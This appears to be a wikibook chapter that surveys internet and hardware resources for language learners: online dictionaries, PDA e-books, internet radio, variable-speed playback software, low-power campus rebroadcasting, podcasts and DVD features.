*For English-speakers reading non-English languages, [http://www.wordchamp.com '''WordChamp'''] provides a free [http://www.wordchamp.com/lingua2/Reading.do Web Reader] that provides instant mouse-over translations in many different languages (best coverage is provided for French, German, Spanish, Chinese and Japanese, but there is a significant amount of vocabulary in a dozen other languages, and registered users can add their own vocabulary). There are over 60,000 audio recordings of native speakers (in eleven languages), which can be listened to while reading a site. This is a very powerful tool for reading foreign-language texts (WordChamp also includes other tools that are discussed in the Exercise and Assessment sections of this wikibook), although translations for many low-frequency words are not provided, the latest version of WordChamp allows users to add their own translations which in a wiki fashion should dramatically increase the word coverage.

*Ultralingua [http://www.ultralingua.net] also provides translations by clicking on words found on webpages. A few free lookups can be made each day. A subscription of $29.95 per year is required to allow up to 500 lookups per day. Unlike WordChamps web reader, Ultralingua's does not provide pronunciations of any words. It is also limited to translating among English, French, Spanish, Italian and Portuguese, but it currently appears to have greater coverage of words in these languages than does WordChamp's web reader (which is free; see above).

* [http://www.word2word.com World2World Language Resource] provides links to bilingual translation dictionaries involving 192 languages (from Abadani to Zarma), including many specialized dictionaries, e.g., computer culture and technology. 

* English speakers learning Spanish, French or Italian, or speakers of any of the latter languages learning English will find the online versions of Collins translation dictionaries provided by [http://www.wordreference.com WordReference.com] useful.  As noted on their website, their English-Spanish dictionary alone contains more than 160,000 words and more than 230,000 translations and would take up 1290 pages of paper to print.  Particularly handy is that WordReference can be used as a browser add-on tool which allows the user to quickly translate any word found in any Web page using Internet Explorer or Netscape Navigator on a Windows computer.

* [[wikimedia:Link_Everything_Online | '''LEO''']], (for [http://www.leo.org &quot;Link Everything Online&quot;]) is an impressive resource for language learners needing bilingual, bidirectional [http://dict.leo.org/?lang=de&amp;lp=ende German-English] (410,686  entries) and [http://dict.leo.org/?lang=de&amp;lp=frde German-French] (139,073 entries) dictionaries.  LEO provides not only definitions but also grammatical information, usage examples, idioms, and pronunciation (including audio) for any English or German word entered.  For example, entering the words “eye” produced not only five German translations of “eye,” but also 28 verbs and verb phrases containing eye (e.g., “to catch someone’s eye”), 22 phrases and collocations (e.g., “in the twinkling of an eye”) and more than 50 composed entries (e.g., “eagle eye”).  In addition, every word that appears as part of a definition or example is linked to a definition and other entries of its own.

Among these resources are the Hypertext Builders that allow a teacher or student to submit a text in English or French and have it automatically posted on the Web with each word linked to concordances (to see how each word is typically used) and to a French-English or English-French dictionary.

* For language learners wanting assistance in translating more than words and phrases, many free translation services can also be found on the Web.
**A directory of 13 free Web-translation services providing translations involving at least 38 different languages can be found at [http://babelfish.org Babelfish].  While machine translation is still no match for skilled human translators, language learners may nonetheless find such services occasionally useful (readers knowing French may find it amusing that Babel Fish Translation translated the word “match” in the preceding sentence using the French word “allumette”).
**Another online translation service is offered by [http://www.google.com/language_tools?hl=en Google], providing translations from about eight languages into English and vice versa.

=== [[metawikipedia:wikipedia:Personal_digital_assistant | PDAs]] (Personal Digital Assistants) ===

While the availability of interesting multilingual texts and language tools on the Internet gives language learners access to a wide range of second reading material that could not be obtained otherwise, using a desktop or laptop computer is not always the most convenient means for reading them.  Printouts, of course, can be made, but printing takes time, consumes paper and ink, and produces output that can be inconvenient to carry around.  An alternative that combines the accessibility of the Internet with the portability of a palm-sized device involves using a Personal Digital Assistant (PDA) to store and display FL texts.  While reading a book, magazine or newspaper article from a PDA requires the reader to put up with small type on a small screen, this may be compensated by the advantage of having foreign-language reading material always available and accessible at any time, such as while commuting in a bus or train or waiting in line at a bank or ticket office.  The most popular PDAs are those that use the Palm or Pocket PC operating system and the least expensive PDA with enough memory to be used for such a system is currently the [http://www.palmone.com/us/products/handhelds/zire21/ Palm Zire 21] which has 8MB of memory and a monochrome screen for $99.

==== Connecting PDAs to the Internet ====

There are two ways to put Web content on a PDA such as those produced by [[metawikipedia:wikipedia:PalmOne%2C_Inc. | Palm or PalmOne]], [[metawikipedia:wikipedia:Pocketpc | Pocket PC]], or [[metawikipedia:wikipedia:Zaurus | Zaurus]].  The first is to connect the PDA directly to the Internet for web browsing.  This requires that the PDA be connected to the Internet using a wired connection (which limits its mobility) or a wireless connection (which requires a more expensive PDA and a wireless Internet subscription service or public WiFi access point).  The second way involves using a desktop or laptop to obtain web content and then transferring the content from personal computer to PDA.  Do to its significantly lower cost and the wide availability of personal computers, this latter method is recommended.

* [http://manybooks.net '''Manybooks.net'''] claims to have &quot;10,425 eBooks formatted for reading on your Palm, PocketPC, Zaurus, Rocketbook, or Symbian cellphone&quot; obtained from Project Gutenberg and other sources formatted for downloading to and reading on a PDA.  In addition to English which represents the majority of books, texts are also available in Bulgarian, Chinese, Dutch, Finnish, French, German, Italian, Japanese, Latin, Portuguese, Russian, Sanskrit, Slovak, Spanish, Swedish, and Welsh.

* [http://www.ee.ryerson.ca/~elf/gut '''gut'''] is a free program that can convert any plain-text file into Plucker format (see below) for downloading to a Palm PDA.  gut is particularly useful for converting the many Project Gutenberg etexts that have not already been converted for use on a PDA and are therefore not available on Manybooks.net.

* [http://www.avantgo.com '''AvantGo'''] is “a free service that delivers thousands of mobile websites to consumers on their personal data assistants (PDAs) and smartphones” (from AvantGo’s website).  Information from these mobile websites (called “channels”) is downloaded to one’s PDA (Windows CE, Palm OS or Symbian) via either wireless surfing or while synching with one’s Internet-connected personal computer.  While the majority of AvantGo’s mobile channels are in English, several free non-English channels are also available.  These include BBC Mundo and Punto-com (Spanish), Le Monde interactif – actualités and Ici Radio-Canada.ca (French), and Spiegel Online (German).  All of these channels provide current news articles updated at least daily.  Other FL AvantGo channels are in Chinese, Danish, Dutch, Finnish, Icelandic, Italian, Norwegian, Portuguese, Russian and Swedish (do an “advanced search” after registering to find these).

==== Bilingual Dictionaries for PDAs====

If one is going to be reading a FL on a PDA, a bilingual dictionary will certainly prove useful.  Fortunately, there is no shortage of such dictionaries, but unlike those available on the Web, they are not free.

There are two main types of translating dictionaries available for PDAs.  The first type provides minimal translation and grammatical information (and may not even include the grammatical gender of French, Spanish or German nouns).  An example of this type are the Bdicty Dictionary Readers provided by [http://www.beiks.com Beiks] for Palm OS, PocketPC, eBookMan and Zaurus plus WinCE and Java smartphones.  The advantage of this minimalist approach is that these dictionaries are relatively inexpensive and take up little memory.  A software bundle consisting of all the Palm OS BDicty dictionaries needed for two-way translation plus phrase books for English with Spanish, French and German can be had for $24.95, all taking up less than a total of 4 megabytes of total memory.  

The other type of bilingual dictionaries for PDAS have larger word lists, more complete translations, usage examples and grammatical information. The bilingual dictionaries provided by [http://www.ultralingua.com Ultralingua] are of this type and include conjugation information for many verbs in certain versions of their PDA dictionaries.  Ultralingua provides two-way bilingual PDA (Palm and Pocket PC) dictionaries for English paired with French, German, Spanish, German, Portuguese, Italian, Norwegian, Latin and Esperanto as well as French-German, French-Spanish, French-Italian, Spanish-Portuguese, and German-Spanish. Users can also add there entries to these dictionaries and access them from other Palm or Pocket PC applications. Two disadvantages of the Ultralingual dictionaries compared to the minimalist BDicty dictionaries are the former’s higher cost ($29.95 for each language pair) and increased memory demands of about 3 MB for each dictionary installed.

Many of these PDA dictionaries are available in free trial versions that are limited either in the amount of entries included or the amount of days the software will operate without purchasing a registration key.

There is an enormous amount and variety of reading material available via the Internet in all of the world’s commonly studied languages and many less-commonly ones, too.  Books, newspapers and magazines articles are available to anyone with Internet access (even relatively slow telephone modems) using a computer with a web browser.  And many of these texts can be easily downloaded to a PDA for instant access anywhere and anytime.

=== Internet Audio ===

For autonomous language learners interested in improving their listening comprehension, the Internet now provides a diversity of audio sources comparable to what is available in text.  A wide range of audiobooks in many languages are available for free or purchase and radio stations from almost every country in the world are now streaming their broadcasts on the Internet.  These are accessible to any Internet-connected computer on which the appropriate streaming media player has been installed, even using a relatively slow telephone modem.  The most popular formats for streaming audio programs on the Internet are those playable on [[wikipedia:Real Player | RealPlayer]] (for Windows, Macintosh and Unix/Linux) or [[wikipedia:Windows Media Player | Windows Media Player]] (for Windows or Macintosh) with [[wikipedia:QuickTime | QuickTime]] (for Windows and Macintosh) and [[wikipedia:WinAmp | WinAmp]] (for Windows) also occasionally encountered.  Almost all audio on the Web is playable with one of these free players and some programs are provided in two or more of these formats.  Audio programs may be provided in both live and pre-recorded (on-demand) format with some pre-recorded programs available for download (allowing the user to play the program later without having to be connected to the Internet).

==== [http://en.wikipedia.org/wiki/Internet_Radio Internet Radio] Directories ====

While the Internet links provided above connect to many interesting Internet radio stations in Spanish, French and German, readers may well want to find there own sources of audio programs in these and other languages.  Fortunately, there are many directories of Internet radio stations on the web that can help language learners find radio stations in a desired country and/or language.  Several of these that have been found useful are:

* [http://radiotime.com RadioTime] provides links to &quot;10,000+ radio stations and shows&quot; (from website). Radio stations providing Internet streaming can be easily found in different languages by searching by [http://radiotime.com/region/c_0/Browse_Locations.aspx &quot;browsing by location&quot;] and choosing the country where the desired language is spoken. Registered users (free) can store favorite stations as presets stored in user-defined directories. For a fee, RadioTime also provides software for users to automatically record desired radio shows as predetermined times either via the Internet or off the air using their USB radio receiver. 
* [http://www.reciva.com/ Reciva Radio Directory] The Reciva Internet Radio Directory lists over 5,000 stations in 327 categories that can be searched by name, country and genre. It is claimed that all links are checked daily resulting in a much higher percentage of valid links than the Internet radio links included in most other directories. These can be heard using an Internet-connected personal compter or a [[Wikipedia:Internet_radio_device | Internet radio device]] using Reciva technology. As most of the audio streams are in Windows Media Player (WMP), Macintosh users should download and install the free [[Wikipedia:Flip4Mac | Flip4Mac]] plug-in, which enables the playing of WMP streams and files on QuickTime, and/or [[Wikipedia:VLC_media_player | the VLC media player]].

==== Enhancing Convenience, Accessibility and Portability of Internet Audio ====

While the current accessibility of FL radio on the Internet is a marvelous resource for FL students, there are a number of factors which limit the usability of this resource.  This section will address several of these limitations and suggest ways of overcoming them.

Reliability and playback control. One problem with listening to Internet radio is its lack of reliability.  While broadcast radio stations are usually very reliable and are only rarely interrupted by extreme weather, power blackouts, or equipment failure, this is not the case for many Internet radio stations.  Interruptions in service may be due to software or hardware problems at the providers end, high demand (unlike broadcast radio, an Internet radio station can be received only by some finite number of listeners), interruptions to the user’s Internet service, or Internet traffic jams and slowdowns causing an audio player to lose its data stream.

Although there is nothing that an individual user can do about these problems except try again later, there is a way to automatically restart dropped audio streams by embedding the audio link in a web page that refreshes periodically.  Users who have some knowledge of HTML and webpage design can see how this is done [http://www.uiuc.edu/ph/www/g-cziko/fl_radio/fl_radio here] by viewing the source for the page.  Users of this page to gain access to live programs in Spanish, French and German will notice a brief pause every 30 minutes when the page refreshes.  If the link had been lost during this time, it will be automatically connected again (if available).  This website also allows listeners to construct a playlist of desired recorded (on-demand) programs with an option to repeat the list indefinitely.  Having one or more programs repeat indefinitely is one way to give FL learners repeated exposure to the same program to aid in comprehension.  These playlist and repeat features are especially useful when combined with one of the low-power radio rebroadcast options described below.

The popularity of VCRs is due partly to their ability to record television shows for playback later at a more convenient time.  Listeners of Internet radio can also record live and archived (on-demand) programs using [http://www.replay-radio.com Replay Radio].  Costing $29.95 with a free demo version available, Replay Radio allows the user of a Windows computer to schedule recordings of favorite audio sites which are stored as [[Wikipedia:Mp3 | MP3]] files that can be played back using any one of many programs and playback devices, such as Apple’s iPod music player or other portable MP3 player.  Setting up one-time or automated daily or weekly recordings is quite easy using this software.  Another audio recording program of interest is [http://www.relaxingsoftware.com/recallbuy.htm Total Recall].  A $20 shareware program for Windows, Total Recall lacks Replay Radio’s automatic scheduling function, but it allows recording (to MP3 and WAV format) of any audio produced by one’s computer, including an attached microphone.  For Macintosh users, WireTap [http://www.ambrosiasw.com/utilities/freebies/ Wire Tap] is a free program that records all audio produced by the computer.  [http://www.rogueamoeba.com/audiohijack/ Audio Hijack] provides added features for recording audio from the Mac, including the ability to restrict recording to a selected program and set start and stop times for unattended operation (see [http://www.macworld.com Macworld’s] March 2004 issue for a review of these and another streaming audio recording software).

==== Speed Control (Variable-Speed Playback)====

Intermediate-level FL learners will undoubtedly find that many of the radio programs produced for domestic audiences use language that is simply too fast for good comprehension.  While there is nothing one can do about this for normal broadcast radio, there are ways to control the speed of Internet radio.

Versions 9 and 10 [http://www.microsoft.com/windows/windowsmedia/mp10/default.aspx Windows Media Player] (WMP) for Windows XP includes a variable speed playback control for locally stored files in WMA, WMV, WM, MP3 or ASF format.  Speed can be varied continuously from half (0.5) to twice (2.0) normal speed without changing the pitch of the audio (avoiding the “chipmunk effect”).  (Users of WMP 9 should note that only slow (0.5), normal and fast (1.4) speeds can be selected from the Play command (Play &gt; Play Speed).  To set the playback speed anywhere between 0.5 and 2.0 go to Now Playing &gt; Enhancements &gt; Play Speed Settings.)

Although WMP speed control cannot be used for live or recorded (on-demand) streaming audio, some providers of FL Internet radio allow users to download their archived audio programs.  Radio France Internationale, for example, allows users to download (“télécharger”) all of its recent news broadcasts in both RealPlayer and WPM format (go to [http://www.rfi.fr/Fichiers/ecouter/audiocarte.asp audiocarte]).  One can download the desired broadcast in WMP by clicking on the WMP icon (an arrowhead inside of a multicolored circle) and then play it back as slow as 0.5 using the WMP 9 player for Windows XP.

[[metawikipedia:wikipedia:QuickTime|QuickTime Player]] version 7 and higher (free) for Macintosh and Windows also permits speed control on playback of MP3 and some other types of audio files as well as MP4 (video).  To use this feature, go to Windows -&gt; Show A/V Controls and move the slider anywhere from 1/2 to three times normal speed. The ability of QuickTime Player to vary the playback speed of MP3 and MP4 files means that it is possible to play any audio or video podcasts at a slower or faster speed than normal. By right-clicking on an audio or video podcast in iTunes and selecting &quot;Show Song File,&quot; the selected file can be opened and played with QuickTime Player instead of with iTunes which does not provide speed control.

[[metawikipedia:wikipedia:iTunes|iTunes]] does not allow variable-speed playback.  However, by right-clicking (control-click for Macintosh) on a desired track and selecting &quot;Show Song File&quot;, it is easy to find the actual MP3 file. Then right-clicking on the file will allow you to play the file using Windows Media Player or QuickTime Player.  On the Macintosh with OS X, it is possible to drage the file into the QuickTime Player icon if you have this on your task bar to play the file.

A more powerful and flexible speed control option for Internet audio is a commercial plug-in called 2xAV from [http://www.enounce Enounce]. Available in versions for both RealOne Player and WMP (for Windows computers only), ''2xAV'' allows speed control of all RealPlayer and WMP content, whether stored locally or streaming from the Internet.  Allowing speed control anywhere between 0.3 and 2.0 times normal speed, 2xAV’s ability to control the speed of streaming audio is particularly useful for FL learners.  This works best, however, for archived (on-demand) audio as slowing down or speeding up live streams results in playback gaps as the player’s buffer either overflows (during slow playback) or is exhausted (during fast playback).  2xAV in either WMP or RealPlayer versions costs $29.95 with a free trial download available.

'''The Amazing Slow Downer''' by [http://www.ronimusic.com/ Roni Music] ($44.95 for Macintosh and Windows) allows you to speed up or slow down audio on a Mac from -50% to 400% normal speed. You have the ability to control the pitch, keeping it the same level as the original speed or highering or lowering it, and there is a built-in equalizer. You can then save the sped-up or slowed-down files for later playback on one's MP3 player or computer. You can listen to audio from most non-proprietary formats (MP3, WAV, AIFF) and WMA on Windows. You can also listen to the audio from MP4 video files, however the video is not displayed. The product is intended principally for musicians who want to transcribe music or play music at different speeds, but can easily be used for slowing down L2 audio to help with listening comprehension. The Amazing Slow Downer can be very useful for those L2 learners who own a Mac and would like to vary the speed on sound files to help practise listening comprehension.

Although language learners will more often find it useful to slow down the speed of FL Internet radio programs, playing audio at faster than normal speeds may also be useful for listening practice and assessment.  It has been found that some people can listen and understand speech at up to four times normal speed. [http://www.heingartner.com/fasttalk/Now_Hear_This,_Quickly.htm] Having students listen repeatedly to an audio extract at progressively higher speeds that provide comprehensible yet challenging input may be an effective way to “push” the development of a language learner’s listening proficiency by keeping the audio at i + 1.  Having a student adjust the speed of presentation to the fastest speed that remains comprehensible may also provide a way for self-assessment of listening proficiency.

==== Accessibility and Portability ====

While recording and speed control software operate on the dimension of time to make FL Internet radio more convenient and accessible, there are also ways to make Internet radio more convenient and accessible on the dimension of space.  Although predicted to disappear shortly after the introduction of television, the continued existence and popularity of AM and FM broadcast radio is largely due to the fact that broadcast radio can be listened to anywhere (home, car, park, beach) at anytime using small, portable, and low-cost equipment (AM/FM portable radios can be found for less than $10).

This is certainly not the case for Internet radio. Internet radio requires a computer connected to the Internet. While the availability of wireless Internet access (WiFi) continues to grow (particularly on college campuses), using WiFi with a laptop computer is still not nearly as convenient as broadcast radio, and cannot easily be used while walking on campus, driving, or working around one’s home.

One way for FL Internet radio to approach the same convenience and portability of broadcast radio is to use an unlicensed, low-power FM or AM transmitter to broadcast FL Internet programs in one’s home or on a high school or college campus.  This is legal under [[Wikipedia:Part_15 | Part 15]] of [[Wikipedia:Federal_Communications_Commission | FCC]] regulations in the U.S, with similar laws existing in Canada (this option is currently not permitted in the U.K.).  For home use, the [http://www.ccrane.com/radios/fm-transmitters/fm-transmitter.aspx &quot;Digital FM Transmitter&quot;] sold by [http://www.ccrane.com the C. Crane Company] allows one to broadcast Internet radio from a computer on any FM frequency between 87.9 and 107.9 MHz.  This $69.95 unit (which includes an integrated telescoping antenna and can be powered using two AA batteries or the included AC adaptor) allows one to listen to Internet radio in any room of one’s house or apartment that has an FM radio or stereo system with an FM tuner, or outside near the house using a portable radio.  The high-quality, stereophonic signal provided by this unit makes it also quite suitable for listening to music.  Although the transmitter is quite weak out of the box, a simple [http://www.xmfan.com/viewtopic.php?t=3257&amp;postdays=0&amp;postorder=asc&amp;start=0 modification] can be made that will increase its power so that is can be picked up throughout a entire home.

The [http://www.progressive-concepts.com/info/item.html?id=71 Panaxis ACC100 FM transmitter] available from [http://www.progressive-concepts.com Progressive Concepts] for $199.95 has a stronger monophonic signal than the Crane stereo transmitter and it had been used for about two years to broadcast Radio France Internationale throughout the Foreign Languages Building of the University of Illinois at Urbana-Champaign and to much of the quad located to the west and north of the building on 90.5 FM.  The audio output of an Internet-connected computer was connected to the transmitter’s input with the transmitter’s three-foot wire antenna simply taped to the inside of an office window in the French Department.  Another FM transmitter (not tested) designed to be used with Windows or Macintosh computers via a USB port is the [http://www.canakit.com/Contents/Items/UX300.asp USB UX300 transmitter] for $97.76.

Better broadcast coverage is possible using low-power AM transmitters.  Two approaches are possible in the U.S.  The first is to use an FCC certified transmitter that produces no more than 100 milliwatts (1/10 watt) of power and uses an antenna no more than three meters long.  While this power is less than that produced by a small Christmas tree light, a quality transmitter properly installed can be heard a mile or more away, covering most school and university campuses.  One such transmitter that has received good reviews is the [http://www.am1000rangemaster.com Rangemaster 1000] which is available in versions ranging from about $800 to $1000.  It is also possible to link several Rangemaster 1000 transmitters together to provide yet greater coverage. [http://www.itsyourstation.com ItsYourStation.com] has installed many of these transmitters in schools and colleges throughout the U.S. and will provide a turn-key system including studio components for between $2000 and $4000.

An inexpensive approach to low power AM broadcasting is to build your own Part 15, 100 milliwatt transmitter kit. [http://www.ontheair3.com Low Power Radio and Broadcast Company] offers several models of high quality, high performance AM transmitter kits. They are available in both unassembled or assembled. Prices start at $159.95 and have the range of 1/4 to 2 miles when using an outdoor antenna and are ideal for schools, churches, and community broadcasting. These kits are legal to use and comply with Part 15 regulations.

The second approach to low-power AM broadcasting in the U.S. is to take advantage of [[Wikipedia:Part_15 | Part 15]] of [[Wikipedia:Federal_Communications_Commission | FCC]] rules and regulations that permit educational institutions in the U.S. to broadcast signals in the AM broadcast band without limit to the signal strength reaching no more than 30 meters beyond the campus boundaries.  Referred to as Campus Free Radiate (CFR), this approach makes it possible to cover an entire large campus with a centrally located transmitter putting out as much power as needed (10 watts should easily cover a large campus) as long as the signal strength does not exceed specified limits off campus.  Many U.S. universities make use of such systems for unlicensed educational and student radio stations, including Indiana University and Arizona State University, using equipment costing less than $4000 (including transmitter, antenna coupler and antenna) available from [http://www.radiosystems.com Radio Systems].  

There are two things to keep in mind if radio is to be used to make Internet foreign language radio programs more accessible and portable on an educational campus.  First, all unlicensed low-power transmitters must not cause interference to licensed radio stations.  Second, in most cases written permission to rebroadcast Internet radio programs using low-power FM or AM transmitters to locations outside of one’s own home or personal property must be obtained from the copyright holders.  Fortunately, such permission is usually granted at no cost from [http://www.rnw.nl Radio Nederlands], [http://www.rfi.fr Radio France Internationale] and [http://www.dw-world.de the Deutsche Welle] for rebroadcast on the college campuses.  In contrast, neither [http://www.rtve.es/rne/ree/ Radio Exterior España] nor [http://www.bbc.co.uk the BBC] currently allows rebroadcast of its programs obtained from the Internet.  However, Radio Exterior de España will send audio CDs of their programs for rebroadcast on a regular basis (see www.rtve.es/rne/ree/Intercambios.htm) and the BBC will also send CDs of past Spanish programs produced by [http://www.bbcmundo.com BBC Mundo] in Spanish for free rebroadcast.  The radio programs produced by [http://www.voa.gov the Voice of America] in 45 languages are in the public domain and may be rebroadcast without obtaining written permission.

[http://latinoradioservice.org The Latino Radio Service] of [http://www.odos.uiuc.edu/lacasa La Casa Cultural Latina] of [http://www.uiuc.edu the University of Illinois at Urbana-Champaign] appears to be the only low-power AM campus station broadcasting FLs in the U.S. Beginning operation in January 2005, the Latino Radio Service provides news, culture, information and music programs in Spanish and Portuguese using programming available via the Internet (see [http://www.flickr.com/photos/gcziko/sets/72057594117130897/ photos of transmitting equipment]).

Used alone or in combination with the recording and speed-control software described above, low-power broadcasting of Internet FL radio programs has the potential to make FLs very accessible on high school and college campuses throughout the U.S., Canada and any other country that permits such unlicensed low-power broadcasting for educational use (imagine the popularity such systems would enjoy at Chinese universities, if permitted by authorities, for broadcasting programming in English!).

===Podcasts and Podcasting===

[[Wikimedia:Podcasting | Podcasting]] is a way making audio files available to the Internet (see [http://www.ipodlounge.com/index.php/articles/comments/understanding-the-podcasting-revolution/ iPodloung article on podcasting].  Users can subscribe to various feeds (for a directory see [http://www.ipodder.org ipooder.org]) using software that automatically downloads new files (programs) to their computer which can then be automatically &quot;synched&quot; to a portable digital music player.

There are hundreds if not thousands or audio programs available as podcasts in English, with fewer available in other languages.  Podcasting has great potential in allowing language learners to always have with them new and interesting audio programs in their language they are studying.  See the [[Wikipedia:List_of_radio_stations_with_podcasts | list of radio stations with podcasts]].

On 28  June 2005 Apple released '''iTunes''' 4.9 for the Macintosh and Windows.  This was the first  version of iTunes that provides support for podcast reception and production.  You can read more about [http://www.ipodlounge.com/index.php/articles/comments/the-complete-guide-to-itunes-49-with-podcasts/ iTunes 4.9 and how to use it to play and subscribe to podcasts].

In version 6.  of iTunes, podcasts in languages other than English can be found by clicking on &quot;Podcasts&quot; as the source in the left column, than clicking the arrow next to &quot;Podcast&quot; on the top left of the main window and then scrolling down and under &quot;Categories&quot; selecting &quot;International&quot; and then the desired language. A wide range of podcasts focused on learning languages are also available under the &quot;Education&quot; category.

'''MyPodder''' by podcastready [http://www.podcastready.com/ (official site)] makes it possible to receiver podcasts directly on a digital media player, PDA, USB memory or memory card without having to first download and store the podcasts on a computer. Once the device is loaded with the MyPodder program files, it will find and download subscribed podcasts when connected to any Windows computer with a live Internet connection.

'''Yahoo! Podcasts''' [http://podcasts.yahoo.com (official site)]'provides an extensive directory of podcasts and allows you to play selected podcasts from their Web interface.  If Internet Explorer is used as your browser, you can also vary the speed of playback using this interface.

====English Speech Accents====
[http://accent.gmu.edu/ The Speech Accent Archive] developed at George Mason University  presents a large set of speech samples from a variety of language backgrounds. Native and non-native speakers of English read the same paragraph and are carefully transcribed. The archive is used by people who wish to compare and analyze the accents of different English speakers&quot; (from website).

==Text and Audio==

In addition to using the Internet as source of FL materials for reading or listening, the Internet also provides language learners the opportunity to read and listen to the same material at the same time or different times.  Processing both text and audio forms of a FL can be especially valuable for students of English and other languages with writing systems that provide unreliable clues to the pronunciation of words (as in “tough,” “bough,” “though,” and “cough”). Both pre-reading a text before listening and simultaneous reading and listening to a text can greatly aid comprehension and provide the student with important information on how words are written and pronounced in the FL.

Here is an [http://docs.info.apple.com/article.html?artnum=302244 article on how song lyrics can be added to iTunes 5 or later as well as the iPod Nano and fifth generation iPods]. Of course, one can also add transcripts to voice (non-music) MP3 and AAC (M4P) files on iTunes and these iPods.

===Text to Speech===
Text-to-speech (TTS) software based on [http://en.wikipedia.org/wiki/Speech_synthesis speech synthesis] technology can be used to create spoken language from text.

**[http://www.elan.fr/ Acapela Group Speech Synthesis]

===English===

It can be difficult, to find websites that provide audio programs with written transcripts.  Two good sources for learners of English that provide text and accompanying audio are [http://www.voanews.com/specialenglish VOA] and the [http://www.bbc.co.uk/worldservice/learningenglish BBC]. Both provide news and feature articles in both text and audio form so that the learner can pre-read the text before listening to the audio or read along with the broadcast. Taiwan English-language radio station [http://www.icrt.com.tw ICRT] also provides transcripts and downloadable audio files and podcast versions of its [http://www.icrt.com.tw/en/eznews_am.php morning] and [http://www.icrt.com.tw/en/eznews_pm.php afternoon] “EZ News” that includes (actually, not-so-easy) news of Taiwan and world news.

[http://english.donga.com/ Dong-A news] is another web news that provides news in four languages--Korean, Chinese (simplified), Japanese, and English with both text and audio forms. Learners can also compare texts in English and in other three languages. It is a resource not only for learning English, but for learning Chinese, Japanese, and Korean as well.

Another source of text with accompanying video are ebooks and, particularly those that are in the public domain and are offered for free in both text and audio versions (see Audiobooks above). For example, here can be found the [http://literalsystems.com/abooks/audio/goblin_market audiobook version of the poem ''Goblin Market''] by Christina Rossetti.  Although the text version of this poem is not to be found on the LiteralSystems website, a Google search of the opening words &quot;Morning and evening maids heard the goblins cry&quot; quickly reveals where the [http://www.poetryconnection.net/poets/Christina_Rossetti/17738 full text of this poem] can be found.

[http://loudlit.org LoudLit.org] provides several books, short stories and poems that are presented both via text and audio.

[http://www.uh.edu/engines/ Engines of Our Ingenuity] A science-themed audio program produced by the University of Houston that includes transcripts and illustrations.

[http://www.manythings.org/listen/ ManyThings Listening] Brief, topic-based audio clips with a simultaneous flashcard-type text component for ESL learners.

[http://www.britishcouncil.org/professionals-podcast-english-listening-downloads-homepage.htm/ British Council] provides audio clips and text files for listening practice. Audioscripts also contains comprehension questions.

===Spanish===

*[http://www.e-spanyol.hu/en/transcript.php Learn Spanish Online] This is a link to a various amount of Spanish transcripts and their audio online. There are a couple of sounds and the rest focus on pronunciation of letters, words, vowel combinatinos and more. It also goes through pronunciation of commonly used words and phrases in Spanish by native Speakers. They speak slowly enough to be understood and follow the transcript perfectly. Really good as far as pronunciation, listening and following the transcript are concerned.

===Text to Audio Activities===

For online text and matching audio, the following activity involving initial reading and variable-speed listening may prove valuable in improving both reading and listening comprehension of a language.

# Read text, using [http://www.wordchamp.com/lingua/ReadingChampSetup.do WordChamp Web Reader] and/or online dictionaries as needed for comprehension.
#Play audio, reducing speed using [[Wikipedia: Windows Media Player | Windows Media Player]] (to set the playback speed anywhere between 0.5 and 2.0 go to View &gt; Enhancements &gt; Play Speed Settings)or Enounce's [http://www.enounce.com/ 2xAV] plug-in ($29.95) for [[Wikipedia: RealPlayer | RealPlayer]] as necessary for comprehension.
#Play audio repeatedly at slightly faster speeds until there is 100% comprehension at normal speed.
#Consider playing audio again at faster than normal speed for speed listening training.

=== Internet Video ===

In addition to text and audio input, the Internet also promises to be a useful and engaging source of FL input using video (accompanied by audio).  Its present capabilities, however, are still somewhat limited.  Even with a broadband connection and fast computer, Internet video for the most is limited to small, poor-resolution images.  While Internet audio quality often approaches or matches CD quality, there is nothing yet on the Internet that approaches the video quality obtained by even an inexpensive color television set.

A techology called [[Wikipedia:Vodcast | '''vodcasting''']] permits the publication and viewing of on-demand video via the web, much like podcasting allows for audio programs (see also [http://www.vodcast.nl VODcast.nl]).

[[wikipedia:Google Video | Google Video]] [http://video.google.com] has an increasing number of playable videos.  Most appear to be in English, but other languages are available, too.

Listings of Radio-Canada's podcasts (&quot;baladodiffusion&quot;) and RSS feeds are also provided.Of particular interest are the evening television news broadcasts (Le Téléjournal) which are kept for two months after being broadcast. Unfortunately, the video quality is far from state-of-the-art for Internet multimedia as demonstrated by France 24. Hopefully, this will be improved in the future.

==== DVD Players (hardware) for Language Learners ====
Language learners wishing to improve their language proficiency in a foreign language by viewing foreign-language movies and other programs available on DVDs, may find certain features available on some DVD players useful.  These include:

* '''Universal features'''
** ''Zone-free capability'' allows playing DVDs from any region in the world (see [[Wikipedia:Dvd#Region_codes | region codes]])
** ''PAL-to-NTSC and NTSC-to-PAL conversion'' allows playing PAL format DVDs (e.g., European) on NTSC televisions (e.g., U.S.) and vice versa
** ''Universal voltage capability'' allows operation of player from 110 (e.g., in U.S.) to 240 volts (e.g., Europe)

* '''Special playback features'''
** '''Variable-speed playback'' with audio that does not change frequency
** ''Instant replay'' with or without selectable jump-back time interval (about 6 seconds is good to hear a sentence or phrase repeated)
** ''A-B Repeat'' allows the user to indicate with a remote control keypress points A and B while the DVD is playing; player then continuously repeats the A-B segment until a third keypress which causes the DVD to play normally again.

* '''DVD Player Information and Reviews'''

** ''Malata DVP-558.'' Purchased (by GC) from HK [http://www.hkflix.com HK Flix.com] in March 2005 for $159.95 US plus $14.95 US for shipping to the U.S.  This model has all the universal features listed above.  The only special playback feature it has is A-B repeat.  With this feature, if the A-B button on the remote control is pressed twice, the player will repeat the section from A (where first pressed) to B (where pressed second).  This A-B section will be continuously repeated until the A-B button is pressed a third time at which time normal playback continues.

==== DVD Movies ====

Viewing movies in a foreign language can an entertaining and effective way to improve one's listening comprehension in a foreign language.  Due to the fast, colloquial speech used in many movies, even intermediate to advanced learners of a foreign language can experience considerable difficulty in understanding the language used in a movie.

The availability of [[wikimedia:Closed captions | '''closed captions''']] on DVD movies can greatly facilitate the comprehension of foreign-language movies.  Provided for deaf or hearing handicapped viewers, closed captions allow the foreign-language viewer to see (read) what the characters are saying by providing on the screen a transcript of the audio porton of the film.  However, while closed captions are quite common on DVDs released in the U.S. and Canada, they are less likely to be found on other DVDs.  In addition, the captions provided by some DVD movies are not a verbatim transcriptions of the spoken script but rather often paraphrase what is being said, thereby compomising their value for language learners.

Also very useful but even less common is the provision audio description.  Intended primarily four the blind and visually handicapped, [[wikimedia:Audio description | '''audio description''']] provides a spoken description of the scenes and actions of a movie.  By listening to the audio description, language learners can learn many new words as they are used in a meaningful context.

